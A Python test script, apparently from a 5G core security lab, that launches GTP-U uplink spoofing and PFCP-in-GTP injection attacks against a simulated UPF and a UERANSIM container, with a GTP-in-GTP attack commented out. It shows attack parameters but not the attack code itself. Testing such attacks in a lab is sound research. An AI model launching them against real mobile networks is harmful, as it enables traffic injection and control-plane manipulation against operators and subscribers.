import random
from scapy.all import arping, get_if_list

from src import ip_list
from src.attacks.gtp_u import *
from src.benign.procedures import register_new, deregister_random_ue

def random_ue_addr():
    x = random.randint(1, 254)
    return f"10.60.0.{x}"

def random_iname():
    return f"uesimtun{random.randint(0,5)}"

def test_gtp_u_attacks():
    print("[*] Testing gtp uplink attack...")

    print(f"[i]  Interfaces: {get_if_list()}")
    arping(ip_list["UPF"])

    start_gtp_uplink_attack(
        src_addr=ip_list["EVIL"],
        upf_addr=ip_list["UPF"],
        teid=random.randint(0x1, 0xFFFFF),
        ue_addr=random_ue_addr(),
        dst_addr="8.8.8.8",
        upf_dport=2152,
    )

    print("[+] Gtp uplink attack works !\n")

    print("[*] Testing pfcp in gtp attack...")

    register_new()
    client = docker.from_env()
    container = client.containers.get("ueransim")

    res = container.exec_run(
        f'/bin/bash -c "cd /app/ && python3 -m src.attacks.gtp_u.pfcpInGtpAttack {random_ue_addr()} uesimtun0 "'
    )
    print(res.output.decode())
    deregister_random_ue()
    print("[+] Pfcp in gtp attack works !\n")

    # print("[*] Testing gtp in gtp attack...")
    # start_gtp_in_gtp_packet_from_ue(
    #     ue_src_addr=random_ue_addr(),
    #     ue_dest_addr=random_ue_addr(),
    #     victim_teid=random.randint(0x1, 0xFFFFF),
    #     iname=random_iname(),
    # )
    # print("[+] Gtp in gtp attack works !\n")


if __name__ == "__main__":
    test_gtp_u_attacks()
